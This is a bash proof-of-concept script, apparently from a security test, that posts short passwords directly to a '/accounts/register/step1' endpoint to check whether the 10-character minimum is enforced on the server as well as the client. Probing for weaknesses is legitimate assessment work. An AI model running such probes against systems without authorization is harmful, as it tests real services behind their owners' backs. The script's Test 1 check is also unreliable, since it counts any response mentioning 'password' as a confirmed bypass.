#!/bin/bash

# POC: Weak Password Validation - Client-Side Only Bypass
# This script demonstrates that the /accounts/register/step1 endpoint
# accepts passwords shorter than 10 characters via direct HTTP POST requests,
# bypassing the client-side HTML5 minlength="10" validation.

TARGET_URL="${1:-http://localhost:8000}"
ENDPOINT="/accounts/register/step1"

echo "[*] Testing Weak Password Validation Bypass"
echo "[*] Target: $TARGET_URL$ENDPOINT"
echo ""

# Test 1: Submit password with 5 characters (less than minlength="10")
echo "[TEST 1] Submitting password with 5 characters (should be rejected if server-side validation exists)"
echo "------"

RESPONSE=$(curl -s -X POST "$TARGET_URL$ENDPOINT" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=testuser123&password=short&password_confirm=short" \
  -w "\n%{http_code}")

HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)

echo "HTTP Status Code: $HTTP_CODE"
echo ""

# Check if the short password was accepted or rejected
if echo "$BODY" | grep -q "password"; then
  echo "[!] Response contains password-related content (form may have been re-rendered)"
  echo "[RESULT] Likely accepted weak password - Vulnerability confirmed"
  echo ""
else
  echo "[*] Full response body:"
  echo "$BODY"
  echo ""
fi

# Test 2: Submit password with 6 characters
echo "[TEST 2] Submitting password with 6 characters"
echo "------"

RESPONSE=$(curl -s -X POST "$TARGET_URL$ENDPOINT" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=testuser456&password=weak12&password_confirm=weak12" \
  -w "\n%{http_code}")

HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)

echo "HTTP Status Code: $HTTP_CODE"

if [ "$HTTP_CODE" == "200" ] || [ "$HTTP_CODE" == "302" ]; then
  echo "[!] Request accepted (HTTP $HTTP_CODE)"
  echo "[RESULT] Weak password accepted without server-side validation"
else
  echo "[*] Request rejected with HTTP $HTTP_CODE"
fi

echo ""
echo "[*] POC Complete"
echo "[*] If server-side validation exists, it should reject passwords shorter than 10 characters"
echo "[*] If these requests succeed, the vulnerability is confirmed"